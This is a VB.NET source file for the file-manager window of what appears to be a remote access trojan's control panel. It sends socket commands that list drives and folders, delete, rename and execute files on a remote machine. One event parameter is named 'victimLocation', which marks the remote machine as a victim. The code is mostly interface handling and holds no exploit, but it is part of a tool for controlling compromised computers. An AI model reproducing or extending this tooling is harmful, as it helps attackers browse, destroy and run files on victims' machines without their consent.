Imports System.Threading
Public Class FileManager
    Public Event SendFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String) ''send file
    Public Event RetrieveFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String, ByVal filesize As String) ''get file
    Dim assumeddir As String
    Public sock As Integer

    Private Sub FileManager_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        FileListView.Items.Clear() ''clear all files
    End Sub
    Private Sub FileManager_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        clearwait()
        Main.S.Send(sock, Main.n.getdrives & Main.Sep) ''Get hard drives
    End Sub


    Private Sub FileListView_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles FileListView.DoubleClick
        If GoButton.Enabled Then
            If FileListView.FocusedItem.ImageIndex = 0 Or FileListView.FocusedItem.ImageIndex = 1 Or FileListView.FocusedItem.ImageIndex = 2 Or FileListView.FocusedItem.ImageIndex = 3 Then
                If DirTextBox.Text.Length = 0 Then
                    DirTextBox.Text += FileListView.FocusedItem.Text
                    assumeddir += FileListView.FocusedItem.Text
                Else
                    DirTextBox.Text += FileListView.FocusedItem.Text & "\"
                    assumeddir += FileListView.FocusedItem.Text & "\"
                End If
                RefreshList()
            End If
        End If
    End Sub
    Public Sub RefreshList()
        Try
            clearwait()
            Main.S.Send(sock, Main.n.getfileman & Main.Sep & assumeddir)
        Catch ex As Exception
            donewait()
            Try
                UpButton.PerformClick()
            Catch ex2 As Exception
                Main.S.Send(sock, Main.n.getdrives & Main.Sep)
            End Try
            'Try
            '    DirTextBox.Text = assumeddir
            '    DirTextBox.Text = DirTextBox.Text.Substring(0, DirTextBox.Text.LastIndexOf("\"))
            '    DirTextBox.Text = DirTextBox.Text.Substring(0, DirTextBox.Text.LastIndexOf("\") + 1)
            '    assumeddir = DirTextBox.Text
            '    RefreshList()
            'Catch ex1 As Exception
            'End Try
        End Try

    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Select Case FileListView.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                Main.S.Send(sock, Main.n.delete & Main.Sep & Main.n.folder & Main.Sep & assumeddir & FileListView.FocusedItem.Text)
            Case Else
                Main.S.Send(sock, Main.n.delete & Main.Sep & Main.n.file & Main.Sep & assumeddir & FileListView.FocusedItem.Text)
        End Select
        RefreshList()
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub ExecuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExecuteToolStripMenuItem.Click
        Main.S.Send(sock, Main.n.execute & Main.Sep & assumeddir & FileListView.FocusedItem.Text)
    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Dim a As String
        a = InputBox("Enter New Name", "Rename")
        If a <> "" Then
            Select Case FileListView.FocusedItem.ImageIndex
                Case 0 To 1
                Case 2
                    Main.S.Send(sock, Main.n.rename & Main.Sep & Main.n.folder & Main.Sep & assumeddir & FileListView.FocusedItem.Text & Main.Sep & a)
                    RefreshList()
                Case Else
                    Main.S.Send(sock, Main.n.rename & Main.Sep & Main.n.file & Main.Sep & assumeddir & FileListView.FocusedItem.Text & Main.Sep & a)
                    RefreshList()
            End Select
        End If
    End Sub

    Private Sub UpButton_Click(sender As Object, e As EventArgs) Handles UpButton.Click
        If Not String.IsNullOrEmpty(assumeddir) Then
            If assumeddir.Length < 4 Then ''dir like C:\
                DirTextBox.Text = ""
                assumeddir = ""
                Main.S.Send(sock, Main.n.getdrives & Main.Sep)
            Else
                DirTextBox.Text = assumeddir
                DirTextBox.Text = DirTextBox.Text.Substring(0, DirTextBox.Text.LastIndexOf("\"))
                DirTextBox.Text = DirTextBox.Text.Substring(0, DirTextBox.Text.LastIndexOf("\") + 1)
                assumeddir = DirTextBox.Text
                RefreshList()
            End If
        End If
    End Sub

    Private Sub RefreshButton_Click(sender As Object, e As EventArgs) Handles RefreshButton.Click
        If Not String.IsNullOrEmpty(assumeddir) Then
            clearwait()
            If assumeddir.Length < 2 Then ''dir like C:\
                assumeddir = ""
                Main.S.Send(sock, Main.n.getdrives & Main.Sep)
            Else
                RefreshList()
            End If
        End If
    End Sub

    Private Sub HomeButton_Click(sender As Object, e As EventArgs) Handles HomeButton.Click
        DirTextBox.Text = ""
        assumeddir = ""
        clearwait()
        Main.S.Send(sock, Main.n.getdrives & Main.Sep) ''Get hard drives (same as load)
    End Sub

    Private Sub GoButton_Click(sender As Object, e As EventArgs) Handles GoButton.Click
        If Not String.IsNullOrEmpty(DirTextBox.Text) Then
            If DirTextBox.Text.Length > 2 Then ''dir like C:\
                assumeddir = DirTextBox.Text
                clearwait()
                Main.S.Send(sock, Main.n.getfileman & Main.Sep & DirTextBox.Text)
            End If
        End If
    End Sub

    Public Sub clearwait()
        FileListView.Items.Clear()
        FileListView.Items.Add("Waiting for response...")
        ''FileListView.Enabled = False
        UpButton.Enabled = False
        HomeButton.Enabled = False
        GoButton.Enabled = False
        DirTextBox.Enabled = False
    End Sub

    Public Sub donewait()
        ''FileListView.Enabled = True
        UpButton.Enabled = True
        HomeButton.Enabled = True
        GoButton.Enabled = True
        DirTextBox.Enabled = True
    End Sub

    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        FileListView.View = View.Details
    End Sub

    Private Sub ListToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListToolStripMenuItem.Click
        FileListView.View = View.List
    End Sub

    Private Sub TilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TilesToolStripMenuItem.Click
        FileListView.View = View.Tile
    End Sub

    Private Sub SmallIconsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SmallIconsToolStripMenuItem.Click
        FileListView.View = View.SmallIcon
    End Sub

    Private Sub LargeIconsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LargeIconsToolStripMenuItem.Click
        FileListView.View = View.LargeIcon
    End Sub

    Private Sub FileListView_ColumnClick(sender As Object, e As ColumnClickEventArgs)

    End Sub

    Private Sub FileListView_SelectedIndexChanged(sender As Object, e As EventArgs)

    End Sub
End Class